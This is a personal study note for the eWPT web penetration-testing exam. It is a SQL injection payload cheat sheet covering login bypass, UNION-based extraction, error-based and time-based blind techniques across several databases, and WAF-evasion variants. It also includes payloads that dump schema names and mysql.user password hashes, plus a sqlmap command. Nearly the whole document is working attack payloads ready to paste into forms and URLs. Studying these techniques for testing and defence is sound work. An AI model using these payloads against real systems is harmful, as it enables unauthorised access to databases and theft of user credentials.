2025-07-24 07:18

Status:

Tags: [[eWPT]] [[SQL Injection]]
###### Prerequisites: 

##  SQL Injection Payload Reference (Extended)

---

## 🔸 Login Bypass Payloads

Used primarily on login forms to force the logic to always return true and bypass authentication:

```
' OR '1'='1
' OR 1=1 --
' OR '1'='1' --
' OR 1=1#
admin' --
admin' #
admin'/*
" OR "" = "
' OR '' = '
' or 1=1 LIMIT 1; --
```

> **Tip:** These work on simple queries like:

```sql
SELECT * FROM users WHERE username = '$input' AND password = '$input';
```

---

## 🔸 UNION-Based SQL Injection

Used to extract data from other tables by merging results via the `UNION` keyword:

### Step-by-step:

1. **Find number of columns**:
    

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
...
```

2. **Test column count with NULLs**:
    

```sql
' UNION SELECT NULL, NULL-- -
```

3. **Extract data**:
    

```sql
' UNION SELECT username, password FROM users-- -
```

> Adjust number of `NULL`s based on column count.

---

## 🔸 Error-Based SQL Injection

Leverages database errors to reveal information:

```sql
' AND 1=CONVERT(int, (SELECT @@version))--     -- MSSQL
' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))--  -- MySQL
```

---

## 🔸 Time-Based Blind SQL Injection

Used when no errors or output are shown. Server delay proves injection success.

### MySQL:

```sql
' OR IF(1=1, SLEEP(5), 0)-- -
' AND SLEEP(5)-- -
```

### PostgreSQL:

```sql
'; SELECT pg_sleep(5); --
```

### MSSQL:

```sql
'; WAITFOR DELAY '00:00:05'; --
```

### SQLite:

```sql
'; SELECT CASE WHEN (1=1) THEN randomblob(1000000000) ELSE 0 END;--
```

---

## 🔸 WAF Bypass Tricks

These payloads use obfuscation, case tricks, encoding, or unusual SQL syntax to bypass filters:

### Obfuscated Operators:

```sql
' oR 1=1-- -
' || '1'='1
' && 1=1
' oR 1 /*comment*/ = /*another*/ 1-- -
```

### Encoded or Commented:

```sql
%27%20OR%201%3D1--        → URL encoded
'/*!OR*/'1'='1            → Inline comments to confuse WAFs
```

### Case Variants:

```sql
' Or '1'='1
' oRder BY 1--
```

### Hex/Char Encoding:

```sql
UNION SELECT char(65,66,67) -- → outputs 'ABC'
```

---

## 🔸 Advanced Payload Examples

### Dumping current DB (MySQL):

```sql
' UNION SELECT schema_name, NULL FROM information_schema.schemata-- -
```

### Extracting user info:

```sql
' UNION SELECT user, password FROM mysql.user-- -
```

### Exploiting blind condition:

```sql
' AND SUBSTRING((SELECT database()),1,1)='a'-- -
```

---

## ✅ Testing Notes

- Always test **one parameter at a time**.
    
- Determine if the param is **string-based** or **integer-based**.
    
- Use **intercepting proxies** (e.g., Burp Suite) to manipulate HTTP requests more effectively.
    
- For blind injections, automate with **sqlmap**:
    

```bash
sqlmap -u "http://site.com/page.php?id=1" --batch --dbs
```

---

## 🔗 Additional Resources

- Payloads All The Things – SQLi  
    [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
    
- SQLMap Official  
    [https://sqlmap.org](https://sqlmap.org/)
### Cheat Sheets

- PayloadBox SQLi Payload List  
    [https://github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)
    
- PortSwigger SQLi Cheat Sheet  
    [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
    

### OWASP Testing Guide (WSTG)

- https://owasp.org/www-project-web-security-testing-guide/

---
